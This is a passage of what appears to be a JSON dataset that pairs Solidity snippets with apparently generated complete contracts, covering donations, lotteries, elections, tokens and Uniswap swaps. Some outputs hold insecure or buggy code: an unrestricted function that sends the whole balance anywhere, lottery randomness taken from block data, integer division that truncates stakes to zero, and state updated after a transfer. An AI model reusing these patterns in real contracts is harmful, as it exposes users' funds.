false,\n            claimed: false\n\n        });\n\n        emit NewAtomicSwap(\n            swapId,\n            payable(_recipient),\n            _recipient,\n            _tokenAddress,\n            _amount,\n            _Hashlock,\n            _timelock\n        );     \n    }\n\n\n    function claim(bytes32 _swapId, bytes32 _Hashlock) public payable claimable(_swapId) matchingHashlocks(_swapId, _Hashlock) existingContract(_swapId) returns(bool){\n        Swap storage s = swaps[_swapId];\n        s.Hashlock = _Hashlock;\n        s.claimed = true;\n        AliceCoin(s.tokenAddress).transfer(s.recipient, s.amount);\n        emit Claimed(_swapId);\n        return true;\n    }\n\n    function refund(bytes32 _swapId) external existingContract(_swapId) refundable(_swapId) returns(bool) {   \n       Swap storage s = swaps[_swapId];\n       s.refunded = true;\n       AliceCoin(s.tokenAddress).transfer(s.Owner, s.amount);\n       emit Refunded(_swapId);\n       return true;\n    }\n\n    function haveContract(bytes32 _swapId) internal view returns (bool available){\n        available = (swaps[_swapId].Owner != address(0));\n    }\n}\n\n\n",
        "output": "",
        "changed": 1
    },
    "884.sol": {
        "input": "struct Campaign {\n    uint256 donations;\n}\n\ncampaign.donations += amount;\n\nstruct Campaign {\n    uint256[] donations;\n}\n\ncampaign.donations.push(amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DonationCampaign {\n    // Define a new structure Campaign\n    struct Campaign {\n        uint256 donations;\n        uint256[] donationAmounts;\n    }\n\n    // Declare a state variable campaign of type Campaign\n    Campaign public campaign;\n\n    // Initialize the campaign in the constructor\n    constructor() {\n        campaign = Campaign(0, new uint256[](0));\n    }\n\n    // Function to donate an amount to the campaign\n    function donate(uint256 amount) public {\n        // Increase the total donations by the donated amount\n        campaign.donations += amount;\n\n        // Add the donated amount to the donationAmounts array\n        campaign.donationAmounts.push(amount);\n    }\n\n    // Function to get the total donations\n    function getTotalDonations() public view returns (uint256) {\n        return campaign.donations;\n    }\n\n    // Function to get all individual donations\n    function getIndividualDonations() public view returns (uint256[] memory) {\n        return campaign.donationAmounts;\n    }\n}\n\n",
        "changed": 0
    },
    "886.sol": {
        "input": "transferFrom(from, to, tokenId)\n\nrequire(to == exists[to], \"Warning, You are selling outside of the contract\")\n\n\n",
        "output": "",
        "changed": 0
    },
    "887.sol": {
        "input": "contract FundMe {\n    constructor() payable {\n    }\n\n}\n\n\n",
        "output": "contract FundMe {\n    constructor() payable {\n        // can be empty and without arguments\n    }\n\n    // TODO rest of your code\n}\n\n",
        "changed": 0
    },
    "888.sol": {
        "input": "contract VANET {\nVehicle[] vehicles;\n\nstruct Vehicle{\n    string name;\n    string owner; \n    string number; \n    string license;\n}\n\nevent VehicleEvent(\n    string name,\n    string owner,\n    string number,\n    string license\n);\n\nfunction setVehicle(string memory _name, string memory _owner, string memory _number, string memory _license) public{\n    vehicles.push(Vehicle(_name, _owner, _number, _license));\n    emit VehicleEvent(_name, _owner, _number, _license);\n}\n\nfunction getVehicle(uint256 id) public view returns (string memory name, string memory owner, string memory number, string memory license) {\n    return (vehicles[id].name, vehicles[id].owner, vehicles[id].number, vehicles[id].license);\n}}\n\n\n",
        "output": "contract VANET {\nVehicle[] vehicles;\n\nstruct Vehicle{\n    string name;\n    string owner; \n    string number; \n    string license;\n}\n\nevent VehicleEvent(\n    string name,\n    string owner,\n    string number,\n    string license\n);\n\nfunction setVehicle(string memory _name, string memory _owner, string memory _number, string memory _license) public{\n    vehicles.push(Vehicle(_name, _owner, _number, _license));\n    emit VehicleEvent(_name, _owner, _number, _license);\n}\n\nfunction getVehicle(uint256 id) public view returns (string memory name, string memory owner, string memory number, string memory license) {\n    return (vehicles[id].name, vehicles[id].owner, vehicles[id].number, vehicles[id].license);\n}}\n\n",
        "changed": 0
    },
    "889.sol": {
        "input": "[StructObject].[Attribute];\n\nfunction getInfo(uint _infoid) external view returns (uint, address) {\n  return (infos[_infoid]._id, infos[_infoid]._add);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract InfoContract {\n    struct Info {\n        uint _id;\n        address _add;\n    }\n\n    mapping(uint => Info) public infos;\n\n    function setInfo(uint _infoid, uint _id, address _add) public {\n        Info storage i = infos[_infoid];\n        i._id = _id;\n        i._add = _add;\n    }\n\n    function getInfo(uint _infoid) external view returns (uint, address) {\n        return (infos[_infoid]._id, infos[_infoid]._add);\n    }\n}\n\n",
        "changed": 0
    },
    "890.sol": {
        "input": "function setData() public {\n  IncrementalPrice[] price = [\n    IncrementalPrice(0, 1000),\n    IncrementalPrice(0.01, 2000)\n ];\n\nIncrementalPrice(0.01 ether, 2000)\n\nIncrementalPrice(0.01, 2000)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract IncrementalPriceContract {\n    struct IncrementalPrice {\n        uint value;\n        uint price;\n    }\n    \n    IncrementalPrice[] public prices;\n    \n    function setData() public {\n        prices.push(IncrementalPrice(0, 1000));\n        prices.push(IncrementalPrice(0.01 ether, 2000));\n        prices.push(IncrementalPrice(0.01 ether, 2000));\n    }\n}\n\n",
        "changed": 0
    },
    "891.sol": {
        "input": "const contract = new ethers.Contract(contractAddress, abiJson, signerInstance);\n\nawait contract.buyNumber(1, {\n    value: ethers.utils.parseEther('0.1')\n});\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract Lottery {\n    address public manager;\n    address payable[] public players;\n\n    constructor() public {\n        manager = msg.sender;\n    }\n\n    function buyNumber() public payable {\n        require(msg.value > .01 ether);\n        players.push(msg.sender);\n    }\n\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, now, players)));\n    }\n\n    function pickWinner() public restricted {\n        uint index = random() % players.length;\n        players[index].transfer(address(this).balance);\n        players = new address payable[](0);\n    }\n\n    modifier restricted() {\n        require(msg.sender == manager);\n        _;\n    }\n\n    function getPlayers() public view returns (address payable[] memory) {\n        return players;\n    }\n}\n\n",
        "changed": 0
    },
    "892.sol": {
        "input": "pragma solidity\u00a0^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract MyCollection is ERC721, Ownable {\n\n    constructor() ERC721(\"MyCollection\", \"MyC\") {\n        _mint(owner(), 1);\n    }\n\n    function claim() external {\n        require(ownerOf(1) == owner(), \"Already claimed\");\n        _transfer(owner(), msg.sender, 1);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "893.sol": {
        "input": "token.transferFrom(address(this), address(this), 10);\n\nfunction createSubDAO (uint _poolGap, uint _DAOID, uint _rate, Dtoken _token) public returns (address daoAddress) {\n    SubDAO subDAO = new SubDAO(_poolGap, _DAOID, msg.sender, _rate, this, _token);\n    daoAddress = address(subDAO);\n\n    Dtoken(_token).transfer(daoAddress, 10);\n}}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Dtoken {\n    function transfer(address to, uint256 amount) public returns (bool);\n    function transferFrom(address from, address to, uint256 amount) public returns (bool);\n}\n\ncontract SubDAO {\n    constructor(uint _poolGap, uint _DAOID, address _owner, uint _rate, address _creator, Dtoken _token) public {\n        // Constructor code here\n    }\n}\n\ncontract MyContract {\n    function transferTokens(Dtoken _token) public {\n        _token.transferFrom(address(this), address(this), 10);\n    }\n\n    function createSubDAO (uint _poolGap, uint _DAOID, uint _rate, Dtoken _token) public returns (address daoAddress) {\n        SubDAO subDAO = new SubDAO(_poolGap, _DAOID, msg.sender, _rate, this, _token);\n        daoAddress = address(subDAO);\n\n        _token.transfer(daoAddress, 10);\n    }\n}\n\n",
        "changed": 0
    },
    "894.sol": {
        "input": " function _beforeTokenTransfer(address from, address to, uint256 tokenId, uint256 batchSize)\n    internal\n    override(ERC721, ERC721Enumerable)\n{\n    super._beforeTokenTransfer(from, to, tokenId, batchSize);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "895.sol": {
        "input": "contract ElectionFactory {\n    address[] public deployedElections;\n    uint public electionsCount;\n    address public owner;\n\n  modifier ownerOnly(){ \n        require(msg.sender == owner); \n        _;\n    }\n    constructor(){\n        owner=msg.sender();\n    }\n    function createElection() public ownerOnly {\n        Election newElection = new Campaign();\n        deployedElections.push(address(newElection));\n        electionsCount++;\n    }\n\n    function getDeployedCampaign(uint index) public view returns (address) {\n        return deployedElections[index];\n    }\n\n    function getCampaignCounts() public view returns (uint) {\n        return campaignsCount;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n    // Election logic here\n}\n\ncontract ElectionFactory {\n    address[] public deployedElections;\n    uint public electionsCount;\n    address public owner;\n\n    modifier ownerOnly(){ \n        require(msg.sender == owner, \"Only the owner can perform this action.\"); \n        _;\n    }\n\n    constructor(){\n        owner = msg.sender;\n    }\n\n    function createElection() public ownerOnly {\n        Election newElection = new Election();\n        deployedElections.push(address(newElection));\n        electionsCount++;\n    }\n\n    function getDeployedElection(uint index) public view returns (address) {\n        require(index < electionsCount, \"Invalid index.\");\n        return deployedElections[index];\n    }\n\n    function getElectionCounts() public view returns (uint) {\n        return electionsCount;\n    }\n}\n\n",
        "changed": 0
    },
    "896.sol": {
        "input": "uint8 public _taxFee = 0;\nuint8 private _previousTaxFee = _taxFee;\n\nuint8 public _liquidityFee = 0;\nuint8 private _previousLiquidityFee = _liquidityFee;\n\nuint8 public _burnFee = 0;\nuint8 private _previousBurnFee = _burnFee;\n\nuint8 public _walletFee = 0;\nuint8 private _previousWalletFee = _walletFee;\n\nuint8 public _buybackFee = 0;\nuint8 private _previousBuybackFee = _buybackFee;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Fees {\n    uint8 public _taxFee = 0;\n    uint8 private _previousTaxFee = _taxFee;\n\n    uint8 public _liquidityFee = 0;\n    uint8 private _previousLiquidityFee = _liquidityFee;\n\n    uint8 public _burnFee = 0;\n    uint8 private _previousBurnFee = _burnFee;\n\n    uint8 public _walletFee = 0;\n    uint8 private _previousWalletFee = _walletFee;\n\n    uint8 public _buybackFee = 0;\n    uint8 private _previousBuybackFee = _buybackFee;\n\n    function setTaxFee(uint8 fee) public {\n        _previousTaxFee = _taxFee;\n        _taxFee = fee;\n    }\n\n    function setLiquidityFee(uint8 fee) public {\n        _previousLiquidityFee = _liquidityFee;\n        _liquidityFee = fee;\n    }\n\n    function setBurnFee(uint8 fee) public {\n        _previousBurnFee = _burnFee;\n        _burnFee = fee;\n    }\n\n    function setWalletFee(uint8 fee) public {\n        _previousWalletFee = _walletFee;\n        _walletFee = fee;\n    }\n\n    function setBuybackFee(uint8 fee) public {\n        _previousBuybackFee = _buybackFee;\n        _buybackFee = fee;\n    }\n\n    function getPreviousFees() public view returns (uint8, uint8, uint8, uint8, uint8) {\n        return (_previousTaxFee, _previousLiquidityFee, _previousBurnFee, _previousWalletFee, _previousBuybackFee);\n    }\n}\n\n",
        "changed": 0
    },
    "897.sol": {
        "input": "(bool sent,) = _charity.call{value: msg.value}(\"\");\nrequire(sent, \"DONATION_FAILED\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CharityDonation {\n    address payable private _charity;\n\n    constructor(address payable charityAddress) {\n        _charity = charityAddress;\n    }\n\n    function donate() public payable {\n        require(msg.value > 0, \"DONATION_NOT_ENOUGH\");\n        (bool sent,) = _charity.call{value: msg.value}(\"\");\n        require(sent, \"DONATION_FAILED\");\n    }\n\n    function getCharityAddress() public view returns (address) {\n        return _charity;\n    }\n}\n\n",
        "changed": 0
    },
    "898.sol": {
        "input": "constructor () {\n    AuthAccounts[msg.sender] = true;\n    AuthAccounts[_addr_1] = true;\n    AuthAccounts[_addr_2] = true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Auth {\n    address owner;\n    mapping(address => bool) public AuthAccounts;\n\n    constructor(address _addr_1, address _addr_2) public {\n        owner = msg.sender;\n        AuthAccounts[msg.sender] = true;\n        AuthAccounts[_addr_1] = true;\n        AuthAccounts[_addr_2] = true;\n    }\n\n    modifier onlyAuth() {\n        require(AuthAccounts[msg.sender] == true, \"Not Authorized\");\n        _;\n    }\n\n    function addAuthAccount(address _addr) public onlyAuth {\n        AuthAccounts[_addr] = true;\n    }\n\n    function removeAuthAccount(address _addr) public onlyAuth {\n        AuthAccounts[_addr] = false;\n    }\n\n    function checkAuth(address _addr) public view returns (bool) {\n        return AuthAccounts[_addr];\n    }\n}\n\n",
        "changed": 0
    },
    "899.sol": {
        "input": "function isBitSet(uint256 b, uint256 pos) public pure returns (bool) {\n        return ((b >> pos) & 1) == 1;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BitManipulation {\n    function isBitSet(uint256 b, uint256 pos) public pure returns (bool) {\n        return ((b >> pos) & 1) == 1;\n    }\n}\n\n",
        "changed": 0
    },
    "900.sol": {
        "input": "    function seeSlot() external view returns(uint) {\n        assembly {\n            let sl:= sload(age.slot)   \n            mstore(0x00, sl)           \n            return (0x00, 0x20)        \n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AgeStore {\n    struct Age {\n        uint age;\n    }\n    \n    Age public age;\n\n    function setAge(uint _age) public {\n        age.age = _age;\n    }\n    \n    function seeSlot() external view returns(uint) {\n        assembly {\n            let sl:= sload(age.slot)   \n            mstore(0x00, sl)           \n            return (0x00, 0x20)        \n        }\n    }\n}\n\n",
        "changed": 0
    },
    "901.sol": {
        "input": "contract LotteryContract {\n  function buyTicket() public {\n  }\n}\n\ncontract CasinoContract {\n  function placeBet() public {\n    LotteryContract.buyTicket()\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract LotteryContract {\n    function buyTicket() public pure returns(string memory) {\n        return \"Ticket bought!\";\n    }\n}\n\ncontract CasinoContract {\n    address addressOfLottery;\n    \n    constructor(address _addressOfLottery) public {\n        addressOfLottery = _addressOfLottery;\n    }\n\n    function placeBet() public view returns(string memory) {\n        LotteryContract lotteryContractInstance = LotteryContract(addressOfLottery);\n        return lotteryContractInstance.buyTicket();\n    }\n}\n\n",
        "changed": 0
    },
    "902.sol": {
        "input": "function getCount() external view returns (uint256) {\n    InterfaceA b = InterfaceA(addressA);\n    return b.count();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface InterfaceA {\n    function count() external view returns (uint256);\n}\n\ncontract MyContract {\n    address public addressA;\n\n    constructor(address _addressA) {\n        addressA = _addressA;\n    }\n\n    function getCount() external view returns (uint256) {\n        InterfaceA b = InterfaceA(addressA);\n        return b.count();\n    }\n}\n\n",
        "changed": 0
    },
    "903.sol": {
        "input": "constructor() {\n    reward.timestamp = block.timestamp;\n    reward.recipients.push(Recipient(msg.sender, 1));\n}\n\nconstructor() {\n    Recipient[] memory recipients = new Recipient[](3);\n    recipients[0] = Recipient(msg.sender, 1);\n    recipients[1] = Recipient(address1, 1);\n    recipients[2] = Recipient(address2, 1);\n    reward.timestamp = block.timestamp;\n\n    for (uint256 i = 0; i < recipients.length; i++) {\n        reward.recipients.push(recipients[i]);\n    }\n}\n\nconstructor() {\n    Recipient[] storage recipients = reward.recipients; \n    recipients[0] = Recipient(msg.sender, 1);\n    reward.recipients = recipients;\n    reward.timestamp = block.timestamp;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RewardContract {\n    // Define the Recipient struct\n    struct Recipient {\n        address recipientAddress;\n        uint256 amount;\n    }\n\n    // Define the Reward struct\n    struct Reward {\n        uint256 timestamp;\n        Recipient[] recipients;\n    }\n\n    Reward public reward;\n\n    // Constructor\n    constructor(address address1, address address2) {\n        // Initialize the recipients array\n        Recipient[] memory recipients = new Recipient[](3);\n        recipients[0] = Recipient(msg.sender, 1);\n        recipients[1] = Recipient(address1, 1);\n        recipients[2] = Recipient(address2, 1);\n\n        // Set the reward timestamp\n        reward.timestamp = block.timestamp;\n\n        // Populate the reward recipients array\n        for (uint256 i = 0; i < recipients.length; i++) {\n            reward.recipients.push(recipients[i]);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "906.sol": {
        "input": "constructor() payable {\n    owner = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract MyContract {\n    address payable public owner;\n\n    // event for EVM logging\n    event OwnerSet(address indexed oldOwner, address indexed newOwner);\n\n    // modifier to check if caller is owner\n    modifier isOwner() {\n        require(msg.sender == owner, \"Caller is not owner\");\n        _;\n    }\n\n    constructor() payable {\n        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor\n        emit OwnerSet(address(0), owner);\n    }\n\n    // Function to change who the owner is\n    function changeOwner(address payable _newOwner) public isOwner {\n        emit OwnerSet(owner, _newOwner);\n        owner = _newOwner;\n    }\n\n    // Function to withdraw balance to the owner\n    function withdraw() public isOwner {\n        owner.transfer(address(this).balance);\n    }\n}\n\n",
        "changed": 0
    },
    "907.sol": {
        "input": "\n IERC20(WETH).approve(routerA, amount);\n\n        IUniswapV2Router02(routerA).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount, \n            0, \n            path2, \n            cttAddress, \n            block.timestamp + 1200\n        );      \n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract MyContract {\n    address private WETH;\n    address private routerA;\n    address private cttAddress;\n    address[] private path2;\n\n    constructor(address _WETH, address _routerA, address _cttAddress, address[] memory _path2) public {\n        WETH = _WETH;\n        routerA = _routerA;\n        cttAddress = _cttAddress;\n        path2 = _path2;\n    }\n\n    function swapTokens(uint256 amount) public {\n        IERC20(WETH).approve(routerA, amount);\n\n        IUniswapV2Router02(routerA).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount, \n            0, \n            path2, \n            cttAddress, \n            block.timestamp + 1200\n        );      \n    }\n}\n\n",
        "changed": 0
    },
    "908.sol": {
        "input": "function withdraw(uint _amount) external {\n    payable(msg.sender).transfer(_amount);    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public owner;\n    uint public balance;\n\n    constructor() public {\n        owner = msg.sender;\n        balance = 0;\n    }\n\n    function deposit() public payable {\n        balance += msg.value;\n    }\n\n    function withdraw(uint _amount) external {\n        require(msg.sender == owner, \"Only the contract owner can withdraw\");\n        require(_amount <= balance, \"Not enough balance to withdraw\");\n\n        payable(msg.sender).transfer(_amount);\n        balance -= _amount;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balance;\n    }\n}\n\n",
        "changed": 1
    },
    "909.sol": {
        "input": "function remove(uint[] storage _arr, uint _removedIndex) public returns(uint[] memory){\n    require(_arr.length > 0, \"No element in Array.\");\n    _arr[_removedIndex] = _arr[_arr.length-1];\n    _arr.pop();\n    return _arr;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ArrayModifier {\n\n    uint[] public arr;\n\n    function remove(uint _removedIndex) public returns(uint[] memory) {\n        require(arr.length > 0, \"No element in Array.\");\n        require(_removedIndex < arr.length, \"Index out of bounds.\");\n        arr[_removedIndex] = arr[arr.length-1];\n        arr.pop();\n        return arr;\n    }\n\n    function getArr() public view returns(uint[] memory) {\n        return arr;\n    }\n\n    function add(uint value) public {\n        arr.push(value);\n    }\n}\n\n",
        "changed": 0
    },
    "910.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract Structure {\n    struct BaseStruct {\n        uint256 a;\n        uint256 b;\n    }\n\n    struct DerivedStruct {\n        BaseStruct base;\n        uint256 c;\n        uint256 d;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract Structure {\n    struct BaseStruct {\n        uint256 a;\n        uint256 b;\n    }\n\n    struct DerivedStruct {\n        BaseStruct base;\n        uint256 c;\n        uint256 d;\n    }\n}\n\n",
        "changed": 0
    },
    "911.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"https:\n\ncontract Auction is ERC721 {\n    \n    constructor() ERC721(\"CollectionName\", \"Symbol\") {}\n    \n    function createAuction() public {\n        uint256 newTokenId = 1;\n\n        _mint(msg.sender, newTokenId);\n        _approve(address(this), newTokenId);\n    }\n    \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "912.sol": {
        "input": "    address public owner;\n    address payable public receiverContract;\n\n    constructor(address payable _receiverContract) payable{\n       receiverContract = _receiverContract;\n        owner = msg.sender;\n    }\n\n    function sendEther() public payable {\n        require(address(this).balance > msg.value, \"Not enough funds\" );\n        receiverContract.transfer(msg.value);\n    }\n\n    receive() external payable {\n  }\n} ```\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EtherTransferContract {\n    address public owner;\n    address payable public receiverContract;\n\n    constructor(address payable _receiverContract) payable {\n        receiverContract = _receiverContract;\n        owner = msg.sender;\n    }\n\n    function sendEther() public payable {\n        require(address(this).balance >= msg.value, \"Not enough funds\");\n        receiverContract.transfer(msg.value);\n    }\n\n    receive() external payable {\n    }\n\n    fallback() external payable {\n    }\n}\n\n",
        "changed": 0
    },
    "914.sol": {
        "input": "function safeMint() external {\n    require(failedCondition);\n    _mint(msg.sender, tokenId);\n}\n\nfunction safeMint() external {\n    if (failedCondition) {\n        _mint(msg.sender, tokenId);\n    }\n}\n\nconst tx = await myContract.safeMint();\nconst txReceipt = await transaction.wait();\n\nif (txReceipt.status) {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => uint256) public balances;\n    uint256 public totalSupply;\n    uint256 public tokenId;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    \n    constructor() public {\n        totalSupply = 1000000000000000000; // 1 Million\n        balances[msg.sender] = totalSupply; // Assigns the total supply to the deployer address\n    }\n    \n    function _mint(address _to, uint256 _tokenId) internal {\n        require(_to != address(0), \"ERC721: mint to the zero address\");\n        balances[_to] += _tokenId;\n        totalSupply += _tokenId;\n        emit Transfer(address(0), _to, _tokenId);\n    }\n\n    function safeMint() external {\n        bool failedCondition = false; // Assuming some condition\n        require(!failedCondition, \"Failed condition\");\n        _mint(msg.sender, tokenId);\n    }\n\n    function safeMintWithCondition() external {\n        bool failedCondition = false; // Assuming some condition\n        if (!failedCondition) {\n            _mint(msg.sender, tokenId);\n        }\n    }\n}\n\n",
        "changed": 1
    },
    "915.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\nstruct list{\n    string Pan;\n    uint age;\n    address Address;\n    bool Enrolled;\n    bool voted;\n} \nstruct candidate_list{\n    string Name;\n    address Address;\n    uint id;\n    bool listed;\n}\naddress constant election_officer = address(0);\nstring constant decimal = \"0\";\nuint constant totalSupply = 1000e18;\naddress constant founder = address(0);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n    struct Voter{\n        string Pan;\n        uint age;\n        address voterAddress;\n        bool Enrolled;\n        bool voted;\n    } \n\n    struct Candidate{\n        string Name;\n        address candidateAddress;\n        uint id;\n        bool listed;\n    }\n\n    address public election_officer;\n    uint public totalSupply;\n    address public founder;\n\n    mapping(address => Voter) public voters;\n    mapping(uint => Candidate) public candidates;\n\n    uint public candidatesCount;\n\n    constructor() public {\n        election_officer = msg.sender;\n        totalSupply = 1000e18;\n        founder = msg.sender;\n        candidatesCount = 0;\n    }\n\n    function enrollVoter(string memory _Pan, uint _age) public {\n        require(!voters[msg.sender].Enrolled);\n        voters[msg.sender].Pan = _Pan;\n        voters[msg.sender].age = _age;\n        voters[msg.sender].voterAddress = msg.sender;\n        voters[msg.sender].Enrolled = true;\n        voters[msg.sender].voted = false;\n    }\n\n    function addCandidate(string memory _name, address _address) public {\n        require(msg.sender == election_officer);\n        candidates[candidatesCount] = Candidate(_name, _address, candidatesCount, true);\n        candidatesCount++;\n    }\n\n    function vote(uint _candidateId) public {\n        require(voters[msg.sender].Enrolled);\n        require(!voters[msg.sender].voted);\n        require(candidates[_candidateId].listed);\n\n        voters[msg.sender].voted = true;\n        candidates[_candidateId].id++;\n    }\n}\n\n",
        "changed": 0
    },
    "916.sol": {
        "input": "int public hp = 100;\n\nint internal attack = 20;\nint private attackMod = 2;\n\nfunction test() public view returns(int){\n    return attack * attackMod;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    int public hp = 100;\n\n    int internal attack = 20;\n    int private attackMod = 2;\n\n    function test() public view returns(int){\n        return attack * attackMod;\n    }\n}\n\n",
        "changed": 0
    },
    "917.sol": {
        "input": "contract NFT_Price_Agreement {\n\n    bool reachedAgreement = false;    \n    uint numParties = 3;\n    uint numSigned = 0;\n    uint totalVal = 0;\n\n    uint nftPrice = 1000000000000000000; \n\n    mapping(address => uint) public nftStake;\n\n    function makeReq(uint reqStake) public {\n        uint stake = nftPrice * (reqStake / 100);\n        totalVal += stake; \n        nftStake[msg.sender] = stake;\n        numSigned++;\n    }\n\n    function confirmReq() public {\n        require(numSigned == numParties, \"Not everyone has agreed on what percent ownership.\");\n        require(totalVal == nftPrice);\n        reachedAgreement = true;\n    }\n}\n\n\n",
        "output": "contract NFT_Price_Agreement {\n\n    bool reachedAgreement = false;    \n    uint numParties = 3;\n    uint numSigned = 0;\n    uint totalVal = 0;\n\n    uint nftPrice = 1000000000000000000; // = 1 ether\n\n    mapping(address => uint) public nftStake;\n\n    function makeReq(uint reqStake) public {\n        uint stake = nftPrice * (reqStake / 100);\n        totalVal += stake; //  to make sure 100% ownership at the end\n        nftStake[msg.sender] = stake;\n        numSigned++;\n    }\n\n    function confirmReq() public {\n        require(numSigned == numParties, \"Not everyone has agreed on what percent ownership.\");\n        require(totalVal == nftPrice);\n        reachedAgreement = true;\n    }\n}\n\n",
        "changed": 0
    },
    "918.sol": {
        "input": "library Structs {\n    struct AnyName {\n        uint256 id;\n    }\n}\n\ncontract ContractA {\n    Structs.AnyName go;\n}\n\n\n",
        "output": "library Structs {\n    struct AnyName {\n        uint256 id;\n    }\n}\n\ncontract ContractA {\n    Structs.AnyName go;\n}\n\n",
        "changed": 0
    },
    "920.sol": {
        "input": "    import \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "921.sol": {
        "input": "function sendViaCall(address payable _to ) external payable  {\n    (bool sent, ) = _to.call{value: address(this).balance}(\"\");\n    require(sent, \"Failed to send Ether\");\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SendEther {\n    \n    constructor() payable public {}\n    \n    function sendViaCall(address payable _to ) external payable  {\n        (bool sent, ) = _to.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n    \n    // Function to receive Ether. msg.value is the amount of Ether sent by the sender.\n    receive() external payable {}\n    \n    // Fallback function is called when msg.data is not empty\n    fallback() external payable {}\n}\n\n",
        "changed": 0
    },
    "922.sol": {
        "input": "   function getEntranceFee() public view returns (uint256) {\n        uint256 minimumUSD = 50 * (10**18);\n        uint256 price = getPrice();\n        uint256 pricision = 1 * (10**18);\n        return ((minimumUSD * pricision) / price);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EntranceFeeContract {\n\n    function getPrice() public view returns (uint256) {\n        // This function should return the price of the token in USD\n        // For the purpose of this example, let's assume the price is always 1 USD\n        return 1 * 10**18;\n    }\n\n    function getEntranceFee() public view returns (uint256) {\n        uint256 minimumUSD = 50 * (10**18);\n        uint256 price = getPrice();\n        uint256 pricision = 1 * (10**18);\n        return ((minimumUSD * pricision) / price);\n    }\n}\n\n",
        "changed": 0
    },
    "923.sol": {
        "input": "\n    \n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping (address => uint256) public balances;\n    mapping (address => mapping (address => uint256)) public allowed;\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function approve(address _spender, uint256 _value) public returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n        return allowed[_owner][_spender];\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        require(balances[_from] >= _value);\n        require(allowed[_from][msg.sender] >= _value);\n\n        balances[_from] -= _value;\n        balances[_to] += _value;\n        allowed[_from][msg.sender] -= _value;\n\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "924.sol": {
        "input": "function getPrice() public view returns (uint256) {\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        return uint256(answer * 10000000000);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface AggregatorV3Interface {\n  function latestRoundData() external view returns (\n    uint80 roundId, \n    int256 answer, \n    uint256 startedAt, \n    uint256 updatedAt, \n    uint80 answeredInRound\n  );\n}\n\ncontract PriceConsumerV3 {\n\n    AggregatorV3Interface internal priceFeed;\n\n    /**\n     * Network: Kovan\n     * Aggregator: ETH/USD\n     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331\n     */\n    constructor() public {\n        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n    }\n\n    /**\n     * Returns the latest price\n     */\n    function getPrice() public view returns (uint256) {\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        return uint256(answer * 10000000000);\n    }\n}\n\n",
        "changed": 0
    },
    "925.sol": {
        "input": " uniswapV2Router.addLiquidityETH{value: ethAmount}(\n     address(this),\n     tokenAmount,\n     0, \n     0, \n\nuniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, \n        path,\n        address(this),\n        block.timestamp\n    );\n\n\n",
